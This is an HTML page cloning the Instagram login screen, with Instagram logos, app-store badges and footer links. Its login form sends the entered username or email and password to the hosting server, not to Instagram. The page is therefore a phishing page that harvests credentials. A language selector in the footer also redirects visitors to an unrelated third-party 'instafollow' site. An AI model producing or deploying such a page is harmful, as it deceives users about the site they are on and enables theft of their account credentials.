<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Instagram</title>
    <link rel="stylesheet" href="styles.css">
  </head>
    <body>
  <span id="root">
    <section class="section-all">


      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://assets.telegraphindia.com/telegraph/f925c476-f624-403c-a083-28c0c791bba7.jpg" alt="Instagram">
                </div>

                <div class="ig">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div>
                <div class="form-wrap">
                  <form class="form" action="/" method="post">

                    <div class="input-box">
                      <input type="text" name="user" placeholder="Phone number, username or email address" id="name" aria-describedby="" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" value="" required>
                    </div>

                    <div class="input-box">
                      <input  type="password" name="password" placeholder="Password" id="password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>

                    <span class="button-box">
                      <button class="btn" type="submit" name="submit">Log in</button>
                    </span>

                    <a class="forgot" href="">Forgot password?</a>
                  </form>
                </div>
              </div>

              <div class="login-box">
                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
              </div>

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>
                </div>
              </div>
            </div>
          </article>
        </div>
      </main>


      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" >
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span class="language">Languages
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

        </div>
      </footer>

    </section>
  </span>


  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>
</body>

</html>
